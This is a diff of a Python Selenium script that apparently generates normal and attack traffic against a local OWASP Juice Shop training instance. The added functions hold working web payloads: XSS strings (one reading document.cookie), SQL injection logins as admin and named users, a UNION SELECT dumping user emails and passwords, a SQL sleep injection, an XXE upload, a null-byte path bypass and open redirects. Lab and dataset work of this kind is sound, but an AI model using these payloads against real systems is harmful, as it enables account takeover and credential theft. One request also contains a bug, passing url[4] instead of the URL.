@@ -7,6 +7,7 @@ import json
 import random
 import datetime
 import string
+import requests
 import paramiko
 import base64
 from time import sleep
@@ -122,6 +123,16 @@ def add_product_to_cart(driver, product_id=None, verbose=config.config['verbose'
     if(random.random() < 0.3):
         scenario_checkout(driver)
 
+
+class Action():
+    def __init__(self, driver):
+        if config.config['verbose']:
+            print ("An action is created")
+        
+        self.driver = driver
+
+
+    
 
 def scenario_click_product(driver, page='home', verbose=config.config['verbose']):   
     #driver.get(config.config['url'])
@@ -542,6 +553,121 @@ def scenario_register(driver, login_after_register=False, verbose=config.config[
 
     return
 
+"""
+===================================================
+The following scenario belongs to attacking actions
+===================================================
+"""
+
+def scenario_error_message_login_with_single_quote_attack(driver, verbose=config.config['verbose']):
+    global is_logged_in
+    global current_logged_in
+    global accounts
+
+    if verbose:
+        print ("ENTER ERROR MESSAGE ATTACK")
+    
+    # 1. Check if is log in
+    if is_logged_in:
+        scenario_logout(driver=driver, verbose=verbose)
+
+    # 2. Attack under specific pattern
+    # 2-1. generate SQL pattern
+    
+    attackPasswordLength = random.randint(1, 15)
+    randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))
+    
+    # 2-2. attack in logging in 
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
+    random_sleep(1, 2)
+    driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys("'")
+    driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
+    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
+    is_logged_in = True
+
+    return
+
+def scenario_redirect_attack(driver, verbose=config.config['verbose']):
+
+    if verbose:
+        print ("ENTER REDIRECT ATTACK")
+    
+    redirect_address = [
+        "/redirect?to=https://gratipay.com/juice-shop",
+        "/redirect?to=http://kimminich.de?pwned=https://github.com/bkimminich/juice-shop"
+    ]
+    
+    driver.get(config.config['url'] + redirect_address[random.randint(0, 1)])
+
+    return
+
+def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
+    global is_logged_in
+    global current_logged_in
+    global accounts
+
+    if verbose:
+        print ("ENTER XSS ATTACK1")
+
+    # 1. Check if is log in
+    if not is_logged_in:
+        loginType = random.randint(0, 1)
+        if loginType == 0:
+            scenario_login(driver=driver, verbose=verbose)
+        elif loginType == 1:
+            scenario_register(driver=driver, login_after_register=True, verbose=verbose)
+
+    # 2. Attack under specific pattern
+    # 2-1. generate XSS pattern
+    attack = ""
+    random_sleep(1, 3)
+    attackType = random.randint(0, 8)
+    attackKeyWordLength = random.randint(1, 15)
+    
+    if attackType == 0:
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+        attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
+    elif attackType == 1:
+        attackKeyWord = []
+        for i in range(attackKeyWordLength):
+            attackKeyWord.append(str(random.randint(65, 122)))
+        attack = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(" + ",".join(attackKeyWord) + "))\"></img>"
+    elif attackType == 2:
+        attackKeyWord = []
+        for i in range(attackKeyWordLength):
+            attackKeyWord.append(str(random.randint(65, 122)))
+        attack = "<img src=x onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#00000" + "&#00000".join(attackKeyWord) + "&#0000039&#0000041\">"
+    elif attackType == 3:
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+        attack = "<<SCRIPT>alert(\"" + attackKeyWord + "\");//<</SCRIPT>"
+    elif attackType == 4:
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+        attack = "</script><script>alert(\'" + attackKeyWord + "\');</script>"
+    elif attackType == 5:
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+        attack = "</TITLE><SCRIPT>alert(\"" + attackKeyWord + "\");</SCRIPT>"
+    elif attackType == 6:
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+        attack = "<IFRAME SRC=\"javascript:alert(\'"+ attackKeyWord + "\');\"></IFRAME>"
+    elif attackType == 7:
+        attack = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>"
+    elif attackType == 8:
+        attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+        base64String = "<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\" x=\"0\" y=\"0\" width=\"194\" height=\"200\" id=\"xss\"><script type=\"text/ecmascript\">alert(\"" + attackKeyWord + "\");</script></svg>"
+        base64decodeString = base64.b64encode(base64String.encode())
+        attack = "<EMBED SRC=\"data:image/svg+xml;base64," + str(base64decodeString)[2:-1] + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
+
+    # 2-2. attack in tracking orders
+    random_sleep()
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[9]/a').click()
+    driver.find_element_by_xpath('//*[@id="orderId"]').send_keys(attack)
+    random_sleep(5, 10)
+    driver.find_element_by_xpath('//*[@id="trackButton"]').click()
+    random_sleep(2,3)
+    driver.switch_to_alert().accept()
+
+    return
+
 def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
     global is_logged_in
     global current_logged_in
@@ -609,29 +735,194 @@ def scenario_xss_searchbar_attack(driver, verbose=config.config['verbose']):
     
     return
 
-def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
+def scenario_admin_login_without_passwd_attack(driver, verbose=config.config['verbose']):
     global is_logged_in
     global current_logged_in
     global accounts
 
     if verbose:
-        print ("ENTER XSS ATTACK1")
-
+        print ("ENTER ERROR MESSAGE ATTACK")
+    
     # 1. Check if is log in
-    if not is_logged_in:
-        loginType = random.randint(0, 1)
-        if loginType == 0:
-            scenario_login(driver=driver, verbose=verbose)
-        elif loginType == 1:
-            scenario_register(driver=driver, login_after_register=True, verbose=verbose)
+    if is_logged_in:
+        scenario_logout(driver=driver, verbose=verbose)
 
     # 2. Attack under specific pattern
-    # 2-1. generate XSS pattern
+    # 2-1. generate SQL pattern
+    
+    attackPasswordLength = random.randint(1, 15)
+    randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))
+    
+    # 2-2. attack in logging in 
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
+    random_sleep(1, 2)
+    driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys("admin@juice-sh.op'--")
+    driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
+    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
+    is_logged_in = True
+
+    return
+
+def scenario_user_login_without_passwd_attack(driver, verbose=config.config['verbose']):
+    global is_logged_in
+    global current_logged_in
+    global accounts
+
+    if verbose:
+        print ("ENTER ERROR MESSAGE ATTACK")
+    
+    # 1. Check if is log in
+    if is_logged_in:
+        scenario_logout(driver=driver, verbose=verbose)
+
+    # 2. Attack under specific pattern
+    # 2-1. generate SQL pattern
+    
+    attackPasswordLength = random.randint(1, 15)
+    randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))
+    
+    # 2-2. attack in logging in 
+    email = ["bender@juice-sh.op'--", "jim@juice-sh.op'--"]
+
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
+    random_sleep(1, 2)
+    driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys(email[random.randint(0, 1)])
+    driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
+    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
+    is_logged_in = True
+
+    return
+
+def scenario_link_tampering(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER LINK TAMPERING")
+    
+    url = "http://localhost:43333/api/Products/9"
+    headers = {"Content-Type": "application/json"}
+    r = requests.put(url=url, headers=headers, data=json.dumps({"description": "<a href=\"http://kimminich.de\" target=\"_blank\">More...</a>"}))
+    
+    if verbose:
+        print (r.status_code)
+
+    return
+
+def scenario_upload_bigger_file(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER UPLOAD BIGGER FILE")
+
+    url = "http://localhost:43333/file-upload"
+    """
+    ======================================
+    TODO: NEED TO INPUT YOUR OWN FILE NAME
+    ======================================
+    """
+    files = {"file": open("HW1.pdf","rb")}
+
+    r = requests.post(url=url, files=files)
+
+    if verbose:
+        print (r.status_code)
+
+    return
+
+def scenario_upload_non_pdf_file(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER UPLOAD NON PDF FILE")
+    
+    url = "http://localhost:43333/file-upload"
+    """
+    ======================================
+    TODO: NEED TO INPUT YOUR OWN FILE NAME
+    ======================================
+    """
+    files = {"file": open("temp.html","rb")}
+
+    r = requests.post(url=url, files=files)
+
+    if verbose:
+        print (r.status_code)
+
+    return
+
+def scenario_user_register_xss_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER USER REGISTER XSS ATTACK")
+
+    url = "http://localhost:43333/api/Users"
+    """
+    ======================================
+    TODO: NEED TO INPUT YOUR OWN FILE NAME
+    ======================================
+    """
+    headers = {"Content-Type": "application/json"}
+    attackKeyWordLength = random.randint(1, 15)
+    attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
+    payload = {"email": "<iframe src=\"javascript:alert(`" + attackKeyWord + "`)\">", "password": "xss"}
+
+    r = requests.post(url=url[4], headers=headers, data=json.dumps(payload))
+
+    if verbose:
+        print (r.status_code)    
+
+    return
+
+def scenario_xxe_retrieve_passwd_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER XXS RETRIEVE PASSWORD ATTACK")
+
+    # 1. move to the complaint page
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[10]').click()
+    random_sleep()
+
+    # 2. type command and upload file
+    driver.find_element_by_xpath('//*[@id="complaintMessage"]').send_keys(random_comment(2))
+    driver.find_element_by_xpath('//*[@id="file"]').send_keys("xxe_tier1.xml")
+    driver.find_element_by_xpath('//*[@id="submitButton"]').click()
+
+    return
+
+def scenario_find_easter_egg_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER FIND EASTER EGG ATTACK")
+
+    driver.get(config.config['url'] + "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
+
+    return
+
+def scenario_access_signature_file_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER XXS RETRIEVE PASSWORD ATTACK")
+    
+    driver.get(config.config['url'] + "/ftp/suspicious_errors.yml%2500.md")
+
+    return
+
+def scenario_server_random_sleep_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER XXS RETRIEVE PASSWORD ATTACK")
+    pausing_time = random.randint(1, 2000)
+    driver.get(config.config['url'] + "/rest/product/sleep(" + str(pausing_time) + ")/reviews")
+
+    random_sleep(pausing_time, pausing_time+1)
+    return
+
+def scenario_retrieve_user_credentials_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER RETRIEVE USER CREDENTIALS ATTACK")
+    
+    driver.get(config.config['url'] + "/rest/product/search?q=qwert')) UNION SELECT '1', id, email, password, '5', '6', '7', '8' FROM Users--")
+
+    return
+
+def scenario_xss_contact_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER XSS CONTACT ATTACK")
+
     attack = ""
     random_sleep(1, 3)
     attackType = random.randint(0, 8)
     attackKeyWordLength = random.randint(1, 15)
-    
+
     if attackType == 0:
         attackKeyWord = ''.join(random.choices(string.ascii_letters + string.digits, k=attackKeyWordLength))
         attack = "<IMG \"\"\"><SCRIPT>alert(\"" + attackKeyWord + "\")</SCRIPT>\">"
@@ -665,14 +956,21 @@ def scenario_xss_trackorders_attack(driver, verbose=config.config['verbose']):
         base64decodeString = base64.b64encode(base64String.encode())
         attack = "<EMBED SRC=\"data:image/svg+xml;base64," + str(base64decodeString)[2:-1] + "\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>"
 
-    # 2-2. attack in tracking orders
+    # 1. move to the complaint page
+    driver.find_element_by_xpath('/html/body/nav/div/ul/li[10]').click()
     random_sleep()
-    driver.find_element_by_xpath('/html/body/nav/div/ul/li[9]/a').click()
-    driver.find_element_by_xpath('//*[@id="orderId"]').send_keys(attack)
-    random_sleep(5, 10)
-    driver.find_element_by_xpath('//*[@id="trackButton"]').click()
-    random_sleep(2,3)
-    driver.switch_to_alert().accept()
+
+    # 2. type command and upload file
+    driver.find_element_by_xpath('//*[@id="complaintMessage"]').send_keys(attack)
+    driver.find_element_by_xpath('//*[@id="submitButton"]').click()
+
+    return
+
+def scenario_undefine_language_attack(driver, verbose=config.config['verbose']):
+    if verbose:
+        print ("ENTER UNDEFINE LANGUAGE ATTACK")
+
+    driver.get(config.config['url'] + "/i18n/tlh_AA.json")
 
     return
 
@@ -765,71 +1063,6 @@ def scenario_sql_login_attack(driver, verbose=config.config['verbose']):
 
     return
 
-def scenario_admin_login_without_passwd_attack(driver, verbose=config.config['verbose']):
-    global is_logged_in
-    global current_logged_in
-    global accounts
-
-    if verbose:
-        print ("ENTER ERROR MESSAGE ATTACK")
-    
-    # 1. Check if is log in
-    if is_logged_in:
-        scenario_logout(driver=driver, verbose=verbose)
-
-    # 2. Attack under specific pattern
-    # 2-1. generate SQL pattern
-    
-    attackPasswordLength = random.randint(1, 15)
-    randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))
-    
-    # 2-2. attack in logging in 
-    driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
-    random_sleep(1, 2)
-    driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys("admin@juice-sh.op'--")
-    driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
-    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
-    is_logged_in = True
-
-    return
-
-def scenario_error_message_login_with_single_quote_attack(driver, verbose=config.config['verbose']):
-    global is_logged_in
-    global current_logged_in
-    global accounts
-
-    if verbose:
-        print ("ENTER ERROR MESSAGE ATTACK")
-    
-    # 1. Check if is log in
-    if is_logged_in:
-        scenario_logout(driver=driver, verbose=verbose)
-
-    # 2. Attack under specific pattern
-    # 2-1. generate SQL pattern
-    
-    attackPasswordLength = random.randint(1, 15)
-    randomPassword = ''.join(random.choices(string.ascii_letters + string.digits, k=attackPasswordLength))
-    
-    # 2-2. attack in logging in 
-    driver.find_element_by_xpath('/html/body/nav/div/ul/li[1]').click()
-    random_sleep(1, 2)
-    driver.find_element_by_xpath('//*[@id="userEmail"]').send_keys("'")
-    driver.find_element_by_xpath('//*[@id="userPassword"]').send_keys(randomPassword)
-    driver.find_element_by_xpath('//*[@id="loginButton"]').click()
-    is_logged_in = True
-
-    return
-
-def scenario_redirect_attack(driver, verbose=config.config['verbose']):
-
-    if verbose:
-        print ("ENTER REDIRECT ATTACK")
-        
-    driver.get(config.config['url'] + "/redirect?to=https://gratipay.com/juice-shop")
-
-    return
-
 #***********************************
 #add all your scenario function here
 #***********************************
@@ -850,10 +1083,22 @@ scenario_list = [
 ]
 
 attack_scenario_list = [
-    scenario_xss_searchbar_attack,
-    scenario_xss_trackorders_attack,
-    scenario_sql_login_attack,
-    scenario_admin_login_without_passwd_attack,
     scenario_error_message_login_with_single_quote_attack,
-    scenario_redirect_attack
+    scenario_redirect_attack,
+    scenario_xss_trackorders_attack,
+    scenario_xss_searchbar_attack,
+    scenario_admin_login_without_passwd_attack,
+    scenario_user_login_without_passwd_attack,
+    scenario_link_tampering,
+    scenario_upload_bigger_file,
+    scenario_upload_non_pdf_file,
+    scenario_user_register_xss_attack,
+    scenario_xxe_retrieve_passwd_attack,
+    scenario_find_easter_egg_attack,
+    scenario_access_signature_file_attack,
+    scenario_server_random_sleep_attack,
+    scenario_retrieve_user_credentials_attack,
+    scenario_xss_contact_attack,
+    scenario_undefine_language_attack,
+    scenario_sql_login_attack
 ]
